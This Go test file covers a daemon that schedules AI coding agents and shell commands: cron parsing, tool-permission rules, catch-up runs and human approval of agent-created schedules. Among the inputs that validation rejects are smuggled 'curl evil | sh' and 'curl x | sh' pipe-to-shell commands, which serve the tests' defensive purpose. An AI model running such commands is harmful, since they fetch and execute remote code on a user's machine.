package daemon

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"google.golang.org/protobuf/proto"

	"github.com/alexjsp/hammock/internal/client"
	pb "github.com/alexjsp/hammock/internal/proto/hammockv1"
)

func TestCron(t *testing.T) {
	loc := time.Local
	at := func(s string) time.Time {
		tm, err := time.ParseInLocation("2006-01-02 15:04", s, loc)
		if err != nil {
			t.Fatal(err)
		}
		return tm
	}
	for _, c := range []struct{ expr, from, want string }{
		{"30 8 * * 1-5", "2026-11-04 08:30", "2026-11-05 08:30"}, // Wed → Thu
		{"30 8 * * 1-5", "2026-11-06 09:00", "2026-11-09 08:30"}, // Fri → Mon
		{"*/15 * * * *", "2026-11-04 10:07", "2026-11-04 10:15"},
		{"0 9 1 * *", "2026-11-04 10:00", "2026-12-01 09:00"},
		{"0 0 * * sun", "2026-11-04 10:00", "2026-11-08 00:00"},
		{"0 0 * * 7", "2026-11-04 10:00", "2026-11-08 00:00"},
		{"@hourly", "2026-11-04 10:00", "2026-11-04 11:00"},
		{"0 12 13 * 5", "2026-11-04 10:00", "2026-11-06 12:00"}, // either day: Friday the 6th comes first
		{"5/20 * * * *", "2026-11-04 10:06", "2026-11-04 10:25"},
	} {
		s, err := parseCron(c.expr)
		if err != nil {
			t.Fatalf("%s: %v", c.expr, err)
		}
		if got := s.next(at(c.from)); !got.Equal(at(c.want)) {
			t.Errorf("%s from %s: %s, want %s", c.expr, c.from, got.Format("2006-01-02 15:04"), c.want)
		}
	}
	// Clock changes (London): 01:30 on the spring-forward day runs at 02:30
	// BST; in autumn the repeated 01:30 runs once.
	if lon, err := time.LoadLocation("Europe/London"); err == nil {
		at := func(s string) time.Time { tm, _ := time.ParseInLocation("2006-01-02 15:04", s, lon); return tm }
		s, _ := parseCron("30 1 * * *")
		if got := s.next(at("2026-03-29 00:00")); got.Format("2006-01-02 15:04 MST") != "2026-03-29 02:30 BST" {
			t.Errorf("spring forward: %s", got.Format("2006-01-02 15:04 MST"))
		}
		s1, _ := parseCron("0 1 * * *")
		if got := s1.next(time.Date(2026, 3, 29, 0, 59, 30, 0, lon)); got.Format("2006-01-02 15:04 MST") != "2026-03-29 02:00 BST" {
			t.Errorf("spring forward, the minute before: %s", got.Format("2006-01-02 15:04 MST"))
		}
		first := time.Date(2026, 10, 25, 1, 40, 0, 0, lon) // the first 01:40 (BST)
		if got := s.next(first); got.Format("2006-01-02 15:04") != "2026-10-26 01:30" {
			t.Errorf("fall back: %s", got.Format("2006-01-02 15:04 MST"))
		}
	}
	// A clock change at midnight (Beirut skips 00:00–01:00 on 2026-03-29):
	// a run due in the skipped hour runs when the clock resumes.
	if bei, err := time.LoadLocation("Asia/Beirut"); err == nil {
		const f = "2006-01-02 15:04 MST"
		for _, c := range []struct {
			expr string
			from time.Time
			want string
		}{
			{"30 0 * * *", time.Date(2026, 3, 28, 12, 0, 0, 0, bei), "2026-03-29 01:30 EEST"},
			{"@daily", time.Date(2026, 3, 28, 12, 0, 0, 0, bei), "2026-03-29 01:00 EEST"},
			{"@daily", time.Date(2026, 3, 28, 23, 59, 30, 0, bei), "2026-03-29 01:00 EEST"},
			{"30 0 * * 0", time.Date(2026, 3, 27, 12, 0, 0, 0, bei), "2026-03-29 01:30 EEST"}, // a Sunday
			{"15 1 * * *", time.Date(2026, 3, 28, 12, 0, 0, 0, bei), "2026-03-29 01:15 EEST"}, // after the gap: as usual
			{"30 0 * * *", time.Date(2026, 3, 29, 1, 40, 0, 0, bei), "2026-03-30 00:30 EEST"}, // already past
		} {
			s, _ := parseCron(c.expr)
			if got := s.next(c.from).Format(f); got != c.want {
				t.Errorf("midnight gap: %s from %s: %s, want %s", c.expr, c.from.Format(f), got, c.want)
			}
		}
	}
	// */2 in the day of month doesn't restrict it (cron's either-day rule): odd days that are Mondays.
	if s, _ := parseCron("0 0 */2 * 1"); !s.next(at("2026-11-04 10:00")).Equal(at("2026-11-09 00:00")) {
		t.Errorf("*/2 with a weekday: %s", s.next(at("2026-11-04 10:00")))
	}
	for _, bad := range []string{"", "* * * *", "61 * * * *", "* 24 * * *", "* * 0 * *", "a * * * *", "*/0 * * * *", "5-1 * * * *"} {
		if _, err := parseCron(bad); err == nil {
			t.Errorf("%q parsed", bad)
		}
	}
	// Weekdays at 08:30.
	w := weekdaySpec([]int32{1, 2, 3, 4, 5}, 8*60+30)
	if got := w.next(at("2026-11-07 07:00")); !got.Equal(at("2026-11-09 08:30")) {
		t.Errorf("weekdays from Saturday: %s", got)
	}
	if got := weekdaySpec(nil, 0).next(at("2026-11-04 10:00")); !got.Equal(at("2026-11-05 00:00")) {
		t.Errorf("every day at midnight: %s", got)
	}
	// Catching up: a daily schedule the same day only; cron within an interval.
	daily := &pb.Schedule{MinuteOfDay: 8*60 + 30}
	if !catchUpOK(daily, at("2026-11-04 08:30"), at("2026-11-04 18:00")) || catchUpOK(daily, at("2026-11-04 08:30"), at("2026-11-05 07:00")) {
		t.Error("daily catch-up window")
	}
	hourly := &pb.Schedule{Cron: "0 * * * *"}
	if !catchUpOK(hourly, at("2026-11-04 08:00"), at("2026-11-04 08:40")) || catchUpOK(hourly, at("2026-11-04 08:00"), at("2026-11-04 09:10")) {
		t.Error("cron catch-up window")
	}
}

func TestToolRule(t *testing.T) {
	for _, c := range []struct {
		tool string
		in   map[string]any
		want string
	}{
		{"Bash", map[string]any{"command": "gh pr view 12"}, "Bash(gh pr:*)"},
		{"Bash", map[string]any{"command": "ls -la /tmp"}, "Bash(ls:*)"},
		{"Bash", map[string]any{"command": "cat ./notes.md"}, "Bash(cat:*)"},
		{"WebFetch", map[string]any{"url": "https://example.com/a"}, "WebFetch(domain:example.com)"},
		{"mcp__claude_ai_Slack__slack_read_thread", nil, "mcp__claude_ai_Slack__slack_read_thread"},
	} {
		if got := toolRule(c.tool, c.in); got != c.want {
			t.Errorf("%s %v: %q, want %q", c.tool, c.in, got, c.want)
		}
	}
}

// schedClock is a test clock for the scheduler.
type schedClock struct {
	mu sync.Mutex
	t  time.Time
}

func (c *schedClock) now() time.Time  { c.mu.Lock(); defer c.mu.Unlock(); return c.t }
func (c *schedClock) set(t time.Time) { c.mu.Lock(); c.t = t; c.mu.Unlock() }

func useSchedClock(t *testing.T, start time.Time) *schedClock {
	c := &schedClock{t: start}
	old := schedNow
	schedNow = c.now
	t.Cleanup(func() { schedNow = old })
	return c
}

func hook(d *Daemon, pane, event string, payload map[string]any) {
	if payload == nil {
		payload = map[string]any{}
	}
	payload["hook_event_name"] = event
	b, _ := json.Marshal(payload)
	d.mu.Lock()
	d.agentHub.handle(HookEvent{PaneID: pane, Harness: "claude", Payload: b})
	d.mu.Unlock()
}

func schedOf(d *Daemon, id string) *pb.Schedule {
	d.mu.Lock()
	defer d.mu.Unlock()
	if s := d.sched.list[id]; s != nil {
		return proto.CloneOf(s)
	}
	return nil
}

func tick(d *Daemon, c *schedClock, t time.Time) {
	c.set(t)
	d.mu.Lock()
	d.checkSchedules(t)
	d.mu.Unlock()
}

// longTools is an allowed-tools list well past the terminal's 1024-byte line.
var longTools = func() []string {
	var out []string
	for i := range 40 {
		out = append(out, fmt.Sprintf("mcp__claude_ai_Example__tool_number_%02d", i))
	}
	return out
}()

// A schedule runs an agent in its Group on time, follows it to done,
// waits on you (and gives up), catches up after sleep, skips overlaps,
// remembers tools, and closes old runs' tabs.
func TestScheduledAgentRuns(t *testing.T) {
	bin := t.TempDir()
	os.WriteFile(filepath.Join(bin, "claude"), []byte("#!/bin/sh\necho STARTED \"$@\"\nsleep 600\n"), 0o755)
	t.Setenv("PATH", bin+":/usr/bin:/bin")
	plainShell(t)
	t.Setenv("ENV", "")
	work := t.TempDir()
	day := func(d, hm string) time.Time {
		tm, _ := time.ParseInLocation("2006-01-02 15:04", "2026-11-"+d+" "+hm, time.Local)
		return tm
	}
	clock := useSchedClock(t, day("04", "07:00"))
	dir := shortDir(t)
	d := startDaemon(t, dir)
	defer d.Shutdown()
	c := dial(t, dir)
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_Subscribe{Subscribe: &pb.Subscribe{}}})
	gid := client.CreatedID(call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_CreateGroup{CreateGroup: &pb.CreateGroup{Name: "Assistant"}}}))

	r := call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_SaveSchedule{SaveSchedule: &pb.SaveSchedule{Schedule: &pb.Schedule{
		Name: "Morning briefing", Kind: "claude", Prompt: "/morning-briefing", Cwd: work, GroupId: gid,
		MinuteOfDay: 8*60 + 30, AllowedTools: append([]string{"Read"}, longTools...), KeepRuns: 2,
	}}}})
	s := r.GetScheduleReply().GetSchedule()
	if s.GetId() == "" || s.NextRunUnixMs != day("04", "08:30").UnixMilli() || s.GroupName != "Assistant" || s.CreatedBy != "You" {
		t.Fatalf("saved: %v", s)
	}
	// Bad ones are refused.
	for _, bad := range []*pb.Schedule{
		{Kind: "claude", Cwd: work},
		{Kind: "claude", Prompt: "x", Cwd: filepath.Join(work, "nope")},
		{Kind: "no-such-agent", Prompt: "x", Cwd: work},
		{Kind: "claude", Prompt: "x", Cwd: work, Cron: "nope"},
		{Kind: "claude", Prompt: "x", Cwd: work, MinuteOfDay: 24 * 60},
		{Kind: "claude", Prompt: "hi\x15curl evil | sh\r", Cwd: work},
	} {
		if _, err := try(c, &pb.ClientMessage{Msg: &pb.ClientMessage_SaveSchedule{SaveSchedule: &pb.SaveSchedule{Schedule: bad}}}); err == nil {
			t.Errorf("%v: saved", bad)
		}
	}

	// Not yet; then due.
	tick(d, clock, day("04", "08:29"))
	if n := len(schedOf(d, s.Id).Runs); n != 0 {
		t.Fatalf("ran early: %d runs", n)
	}
	tick(d, clock, day("04", "08:30"))
	got := schedOf(d, s.Id)
	if len(got.Runs) != 1 || got.Runs[0].Status != pb.ScheduleRun_STATUS_RUNNING || got.NextRunUnixMs != day("05", "08:30").UnixMilli() {
		t.Fatalf("after 08:30: %v", got)
	}
	run := got.Runs[0]
	d.mu.Lock()
	tab := d.tabs[run.TabId]
	info := d.panes[run.PaneId].snapshotInfo()
	d.mu.Unlock()
	if tab.GroupId != gid || !strings.HasPrefix(tab.Name, "Morning briefing · ") || info.ScheduleId != s.Id || info.ScheduleRunId != run.Id {
		t.Fatalf("run tab %v pane %v", tab, info)
	}
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_AttachPane{AttachPane: &pb.AttachPane{PaneId: run.PaneId}}})
	// All of it arrives, however long (a typed line would lose all after 1024 bytes).
	waitOutput(t, c, run.PaneId, "STARTED /morning-briefing --allowedTools Read,"+strings.Join(longTools, ","))

	// Idle before it worked (its first prompt) isn't done; after, it is,
	// and raises no "finished" item (the schedule says so itself).
	hook(d, run.PaneId, "SessionStart", nil)
	if st := schedOf(d, s.Id).Runs[0].Status; st != pb.ScheduleRun_STATUS_RUNNING {
		t.Fatalf("idle at start: %v", st)
	}
	hook(d, run.PaneId, "UserPromptSubmit", map[string]any{"prompt": "/morning-briefing", "session_id": "sess-1"})
	hook(d, run.PaneId, "Stop", map[string]any{"last_assistant_message": "Your briefing is ready.", "session_id": "sess-1"})
	got = schedOf(d, s.Id)
	if r := got.Runs[0]; r.Status != pb.ScheduleRun_STATUS_READY || r.Note != "Your briefing is ready." || r.SessionId != "sess-1" || r.EndedUnixMs == 0 {
		t.Fatalf("done: %v", r)
	}
	d.mu.Lock()
	_, item := d.attention["at_"+run.PaneId]
	d.mu.Unlock()
	if item {
		t.Fatal("a finished scheduled run raised an attention item")
	}

	// Run Now; it asks permission: waiting, the tool remembered, then it
	// gives up after the schedule's time.
	tid := client.CreatedID(call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_RunSchedule{RunSchedule: &pb.RunSchedule{ScheduleId: s.Id}}}))
	run2 := schedOf(d, s.Id).Runs[0]
	if run2.TabId != tid || !run2.Manual {
		t.Fatalf("run now: %v", run2)
	}
	hook(d, run2.PaneId, "UserPromptSubmit", map[string]any{"prompt": "/morning-briefing"})
	hook(d, run2.PaneId, "PreToolUse", map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "gh pr view 12"}})
	hook(d, run2.PaneId, "Notification", map[string]any{"notification_type": "permission_prompt", "message": "Claude needs your permission to use Bash"})
	if r := schedOf(d, s.Id).Runs[0]; r.Status != pb.ScheduleRun_STATUS_WAITING || r.WaitingSinceUnixMs == 0 {
		t.Fatalf("waiting: %v", r)
	}
	d.mu.Lock()
	rule, err := d.scheduleToolFor(d.panes[run2.PaneId], "Bash command\n  gh pr view 12\n Do you want to proceed?")
	d.rememberScheduleTool(d.panes[run2.PaneId], rule)
	_, asked := d.attention["at_"+run2.PaneId]
	d.mu.Unlock()
	if !askedAbout("Claude needs your permission to use Edit", "Edit") || askedAbout("Claude needs your permission to use Bash", "Read") ||
		!askedAbout("Claude needs your permission to use slack_read_thread", "mcp__slack__slack_read_thread") || askedAbout("", "Bash(ls:*)") {
		t.Fatal("askedAbout")
	}
	if err != nil || !slices.Equal(schedOf(d, s.Id).AllowedTools, append(append([]string{"Read"}, longTools...), "Bash(gh pr:*)")) {
		t.Fatalf("remembered: %v %v", err, schedOf(d, s.Id).AllowedTools)
	}
	if !asked {
		t.Fatal("asking you raised no Needs You item")
	}
	tick(d, clock, day("04", "12:00")) // waiting since 08:30 (the clock's then): not yet 4 hours
	if r := schedOf(d, s.Id).Runs[0]; r.Status != pb.ScheduleRun_STATUS_WAITING {
		t.Fatalf("gave up early: %v", r)
	}
	tick(d, clock, day("04", "12:31"))
	if r := schedOf(d, s.Id).Runs[0]; r.Status != pb.ScheduleRun_STATUS_GAVE_UP || !strings.Contains(r.Note, "4 hours") {
		t.Fatalf("gave up: %v", r)
	}
	d.mu.Lock()
	_, asked = d.attention["at_"+run2.PaneId]
	d.mu.Unlock()
	if asked {
		t.Fatal("gave up but its Needs You item stayed")
	}
	// A subagent's command since the prompt came doesn't change what's remembered;
	// one the screen doesn't show isn't remembered.
	hook(d, run2.PaneId, "PreToolUse", map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "git status"}})
	d.mu.Lock()
	again, _ := d.scheduleToolFor(d.panes[run2.PaneId], "Bash command\n  gh pr view 12")
	_, notShown := d.scheduleToolFor(d.panes[run2.PaneId], "Bash command\n  npm publish")
	d.mu.Unlock()
	if again != "Bash(gh pr:*)" || notShown == nil {
		t.Fatalf("after a subagent's call: %q, %v", again, notShown)
	}

	// Asleep through the 5th and 6th, awake the 6th at 18:00: one missed,
	// one caught up (the same day).
	run3 := func() *pb.ScheduleRun { return schedOf(d, s.Id).Runs[0] }
	tick(d, clock, day("06", "18:00"))
	got = schedOf(d, s.Id)
	if r := got.Runs[0]; r.Status != pb.ScheduleRun_STATUS_RUNNING || !r.CatchUp || r.DueUnixMs != day("06", "08:30").UnixMilli() {
		t.Fatalf("caught up: %v", r)
	}
	if r := got.Runs[1]; r.Status != pb.ScheduleRun_STATUS_MISSED || r.DueUnixMs != day("05", "08:30").UnixMilli() {
		t.Fatalf("missed: %v", r)
	}
	// Still going the next morning: skipped (the default).
	tick(d, clock, day("07", "08:30"))
	if r := run3(); r.Status != pb.ScheduleRun_STATUS_SKIPPED || r.Note != "The last run was still going" {
		t.Fatalf("overlap: %v", r)
	}
	// Two days asleep: missed, too late to catch up the next morning.
	tick(d, clock, day("09", "07:00"))
	if r := run3(); r.Status != pb.ScheduleRun_STATUS_MISSED || r.DueUnixMs != day("08", "08:30").UnixMilli() {
		t.Fatalf("too late: %v", r)
	}

	// Older runs' tabs close beyond keep_runs (2), but not one you typed
	// into, nor one under way.
	got = schedOf(d, s.Id)
	open := 0
	d.mu.Lock()
	for _, r := range got.Runs {
		if r.TabId != "" && d.tabs[r.TabId] != nil {
			open++
		}
	}
	d.mu.Unlock()
	if open > 2 {
		t.Fatalf("%d run tabs open, keep 2", open)
	}

	// Skip next run; pause.
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_SkipScheduleRun{SkipScheduleRun: &pb.SkipScheduleRun{ScheduleId: s.Id, Skip: true}}})
	tick(d, clock, day("09", "08:30"))
	if r := run3(); r.Status != pb.ScheduleRun_STATUS_SKIPPED || r.Note != "Skipped by you" {
		t.Fatalf("skip: %v", r)
	}
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_SetSchedulePaused{SetSchedulePaused: &pb.SetSchedulePaused{ScheduleId: s.Id, Paused: true}}})
	if got := schedOf(d, s.Id); !got.Paused || got.NextRunUnixMs != 0 {
		t.Fatalf("paused: %v", got)
	}

	// Its Group closed: the next run brings it back, named as it was.
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_CloseGroup{CloseGroup: &pb.CloseGroup{GroupId: gid}}})
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_RunSchedule{RunSchedule: &pb.RunSchedule{ScheduleId: s.Id}}})
	got = schedOf(d, s.Id)
	d.mu.Lock()
	g := d.groups[got.GroupId]
	d.mu.Unlock()
	if got.GroupId == gid || g == nil || g.Name != "Assistant" {
		t.Fatalf("group back: %v %v", got.GroupId, g)
	}
	// Edited while its Group is closed: the Group is kept, to come back.
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_CloseGroup{CloseGroup: &pb.CloseGroup{GroupId: got.GroupId}}})
	got.Name = "Briefing"
	if _, err := try(c, &pb.ClientMessage{Msg: &pb.ClientMessage_SaveSchedule{SaveSchedule: &pb.SaveSchedule{Schedule: got}}}); err != nil {
		t.Fatalf("edit with its Group closed: %v", err)
	}
	if e := schedOf(d, s.Id); e.GroupId != got.GroupId || e.GroupName != "Assistant" || e.Name != "Briefing" {
		t.Fatalf("edited: %v", e)
	}

	// Its agent never shows up: failed after a minute, not running forever.
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_SetSchedulePaused{SetSchedulePaused: &pb.SetSchedulePaused{ScheduleId: s.Id, Paused: false}}})
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_RunSchedule{RunSchedule: &pb.RunSchedule{ScheduleId: s.Id}}})
	stuck := schedOf(d, s.Id).Runs[0]
	d.mu.Lock()
	d.panes[stuck.PaneId].mu.Lock()
	d.panes[stuck.PaneId].info.Agent = nil
	d.panes[stuck.PaneId].mu.Unlock()
	d.mu.Unlock()
	tick(d, clock, time.UnixMilli(stuck.StartedUnixMs).Add(30*time.Second))
	if r := schedOf(d, s.Id).Runs[0]; r.Status != pb.ScheduleRun_STATUS_RUNNING {
		t.Fatalf("gave up on starting too soon: %v", r)
	}
	tick(d, clock, time.UnixMilli(stuck.StartedUnixMs).Add(2*time.Minute))
	if r := schedOf(d, s.Id).Runs[0]; r.Status != pb.ScheduleRun_STATUS_FAILED || !strings.Contains(r.Note, "didn't start") {
		t.Fatalf("never started: %v", r)
	}

	// A restart keeps a next run that's come and gone: it's caught up then.
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_SetSchedulePaused{SetSchedulePaused: &pb.SetSchedulePaused{ScheduleId: s.Id, Paused: true}}})
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_SetSchedulePaused{SetSchedulePaused: &pb.SetSchedulePaused{ScheduleId: s.Id, Paused: false}}})
	due := time.UnixMilli(schedOf(d, s.Id).NextRunUnixMs)
	clock.set(due.Add(20 * time.Minute)) // "booted" after it was due
	d.mu.Lock()
	d.loadSchedules()
	kept := d.sched.list[s.Id].NextRunUnixMs
	d.mu.Unlock()
	if kept != due.UnixMilli() {
		t.Fatalf("restart moved the next run: %v, was %v", time.UnixMilli(kept), due)
	}
	tick(d, clock, due.Add(20*time.Minute))
	if r := schedOf(d, s.Id).Runs[0]; r.DueUnixMs != due.UnixMilli() || !r.CatchUp {
		t.Fatalf("after restart: %v", r)
	}

	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_DeleteSchedule{DeleteSchedule: &pb.DeleteSchedule{ScheduleId: s.Id}}})
	if schedOf(d, s.Id) != nil {
		t.Fatal("not deleted")
	}
}

// A command schedule: its exit says how it went; a failure's pane stays,
// and a success's closes when asked to.
func TestScheduledCommand(t *testing.T) {
	t.Setenv("SHELL", "/bin/sh")
	t.Setenv("ENV", "")
	work := t.TempDir()
	useSchedClock(t, time.Now())
	dir := shortDir(t)
	d := startDaemon(t, dir)
	defer d.Shutdown()
	c := dial(t, dir)
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_Subscribe{Subscribe: &pb.Subscribe{}}})
	save := func(cmd string, closeOK bool) string {
		return call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_SaveSchedule{SaveSchedule: &pb.SaveSchedule{Schedule: &pb.Schedule{
			Kind: "command", Prompt: cmd, Cwd: work, Cron: "0 3 * * *", CloseOnSuccess: closeOK,
		}}}}).GetScheduleReply().GetSchedule().GetId()
	}
	wait := func(id string) *pb.ScheduleRun {
		deadline := time.Now().Add(10 * time.Second)
		for time.Now().Before(deadline) {
			if r := schedOf(d, id).Runs[0]; !runActive(r) {
				return r
			}
			time.Sleep(50 * time.Millisecond)
		}
		t.Fatalf("%s never ended: %v", id, schedOf(d, id).Runs[0])
		return nil
	}
	fails := save("echo nope; exit 3", true)
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_RunSchedule{RunSchedule: &pb.RunSchedule{ScheduleId: fails}}})
	r := wait(fails)
	d.mu.Lock()
	_, open := d.panes[r.PaneId]
	d.mu.Unlock()
	if r.Status != pb.ScheduleRun_STATUS_FAILED || r.ExitCode != 3 || !open {
		t.Fatalf("failed run: %v (open %v)", r, open)
	}
	ok := save("true", true)
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_RunSchedule{RunSchedule: &pb.RunSchedule{ScheduleId: ok}}})
	r = wait(ok)
	time.Sleep(100 * time.Millisecond)
	d.mu.Lock()
	_, open = d.panes[r.PaneId]
	d.mu.Unlock()
	if r.Status != pb.ScheduleRun_STATUS_READY || open {
		t.Fatalf("clean run: %v (open %v)", r, open)
	}
	kept := save("true", false)
	call(t, c, &pb.ClientMessage{Msg: &pb.ClientMessage_RunSchedule{RunSchedule: &pb.RunSchedule{ScheduleId: kept}}})
	r = wait(kept)
	time.Sleep(100 * time.Millisecond)
	d.mu.Lock()
	_, open = d.panes[r.PaneId]
	d.mu.Unlock()
	if !open {
		t.Fatal("a kept command's pane closed")
	}
}

// An agent's schedule waits for your yes (a grant worded from the
// schedule), then is saved; running one is free; guests' and phones'
// limits are checked elsewhere (peerCheck, handleRemoteAuth).
func TestAgentSchedulesAsk(t *testing.T) {
	t.Setenv("SHELL", "/bin/sh")
	work := t.TempDir()
	dir := shortDir(t)
	d := startDaemon(t, dir)
	defer d.Shutdown()
	ui := dial(t, dir)
	call(t, ui, &pb.ClientMessage{Msg: &pb.ClientMessage_Subscribe{Subscribe: &pb.Subscribe{}}})
	gid := client.CreatedID(call(t, ui, &pb.ClientMessage{Msg: &pb.ClientMessage_CreateGroup{CreateGroup: &pb.CreateGroup{Name: "Assistant"}}}))
	tid := client.CreatedID(call(t, ui, &pb.ClientMessage{Msg: &pb.ClientMessage_CreateTab{CreateTab: &pb.CreateTab{GroupId: gid, Pane: &pb.PaneSpec{Command: []string{"/bin/cat"}}}}}))
	d.mu.Lock()
	self := d.tabs[tid].FocusedPaneId
	d.mu.Unlock()
	agent := dialAs(t, dir, &caller{pane: self, agent: true}, "mcp")

	type res struct {
		r   *pb.ServerMessage
		err error
	}
	done := make(chan res, 1)
	go func() {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		r, err := agent.Call(ctx, &pb.ClientMessage{Msg: &pb.ClientMessage_SaveSchedule{SaveSchedule: &pb.SaveSchedule{Schedule: &pb.Schedule{
			Name: "Briefing", Kind: "claude", Prompt: "/morning-briefing", Cwd: work, Weekdays: []int32{1, 2, 3, 4, 5}, MinuteOfDay: 510,
			AllowedTools: longTools, // a long list still reaches you, all of it shown
		}}}})
		done <- res{r, err}
	}()
	var gr *pb.GrantRequest
	for deadline := time.Now().Add(5 * time.Second); gr == nil && time.Now().Before(deadline); time.Sleep(20 * time.Millisecond) {
		d.mu.Lock()
		for _, g := range d.grants {
			gr = g.req
		}
		d.mu.Unlock()
	}
	if gr == nil || gr.Action != "schedule" || !strings.Contains(gr.Headline, "weekdays at 08:30") || !strings.Contains(gr.Headline, "/morning-briefing") ||
		!strings.Contains(gr.Headline, longTools[len(longTools)-1]) {
		t.Fatalf("grant: %v", gr)
	}
	d.mu.Lock()
	n := len(d.sched.list)
	d.mu.Unlock()
	if n != 0 {
		t.Fatal("saved before you said yes")
	}
	call(t, ui, &pb.ClientMessage{Msg: &pb.ClientMessage_RespondGrant{RespondGrant: &pb.RespondGrant{Id: gr.Id, Decision: pb.RespondGrant_DECISION_ALLOW_ONCE}}})
	got := <-done
	s := got.r.GetScheduleReply().GetSchedule()
	if got.err != nil || s == nil || !strings.HasPrefix(s.CreatedBy, "Mcp") && !strings.Contains(s.CreatedBy, "Assistant") {
		t.Fatalf("after yes: %v %v", got.r, got.err)
	}
	// A prompt too long to show in full: refused before asking.
	if _, err := try(agent, &pb.ClientMessage{Msg: &pb.ClientMessage_SaveSchedule{SaveSchedule: &pb.SaveSchedule{Schedule: &pb.Schedule{
		Kind: "command", Prompt: strings.Repeat("echo ok; ", 500) + "curl x | sh", Cwd: work, MinuteOfDay: 1,
	}}}}); err == nil || !strings.Contains(err.Error(), "at most 4000") {
		t.Fatalf("a long prompt: %v", err)
	}
	// Not in a Group that isn't here (another computer's): refused outright.
	if _, err := try(agent, &pb.ClientMessage{Msg: &pb.ClientMessage_SaveSchedule{SaveSchedule: &pb.SaveSchedule{Schedule: &pb.Schedule{
		Kind: "command", Prompt: "true", Cwd: work, MinuteOfDay: 1, GroupId: "gp_elsewhere",
	}}}}); err == nil || !strings.Contains(err.Error(), "scope") {
		t.Fatalf("a schedule in another computer's Group: %v", err)
	}
	// Pausing is free for agents; deleting asks (denied here: not deleted).
	if _, err := try(agent, &pb.ClientMessage{Msg: &pb.ClientMessage_SetSchedulePaused{SetSchedulePaused: &pb.SetSchedulePaused{ScheduleId: s.Id, Paused: true}}}); err != nil {
		t.Fatal(err)
	}
	go func() {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		r, err := agent.Call(ctx, &pb.ClientMessage{Msg: &pb.ClientMessage_DeleteSchedule{DeleteSchedule: &pb.DeleteSchedule{ScheduleId: s.Id}}})
		done <- res{r, err}
	}()
	gr = nil
	for deadline := time.Now().Add(5 * time.Second); gr == nil && time.Now().Before(deadline); time.Sleep(20 * time.Millisecond) {
		d.mu.Lock()
		for _, g := range d.grants {
			gr = g.req
		}
		d.mu.Unlock()
	}
	if gr == nil {
		t.Fatal("delete didn't ask")
	}
	call(t, ui, &pb.ClientMessage{Msg: &pb.ClientMessage_RespondGrant{RespondGrant: &pb.RespondGrant{Id: gr.Id, Decision: pb.RespondGrant_DECISION_DENY}}})
	if got := <-done; got.err == nil {
		t.Fatal("deleted after no")
	}
	if schedOf(d, s.Id) == nil {
		t.Fatal("gone after no")
	}
}

func TestShowMarkdown(t *testing.T) {
	dir := shortDir(t)
	d := startDaemon(t, dir)
	defer d.Shutdown()
	work := t.TempDir()
	md := filepath.Join(work, "brief.md")
	os.WriteFile(md, []byte("# Hello\n\n| a | b |\n|---|---|\n| 1 | 2 |\n"), 0o600)
	page, label, err := d.outputURL("brief.md", work)
	if err != nil || label != md || !strings.HasPrefix(page, "file://") {
		t.Fatalf("%q %q %v", page, label, err)
	}
	html, _ := os.ReadFile(strings.TrimPrefix(page, "file://"))
	if !strings.Contains(string(html), "<h1>Hello</h1>") || !strings.Contains(string(html), "<table>") {
		t.Fatalf("rendered: %s", html)
	}
	if u, _, err := d.outputURL("https://example.com/x", ""); err != nil || u != "https://example.com/x" {
		t.Fatalf("url: %q %v", u, err)
	}
	if _, _, err := d.outputURL(filepath.Join(work, "nope.html"), ""); err == nil {
		t.Fatal("a missing file showed")
	}
}
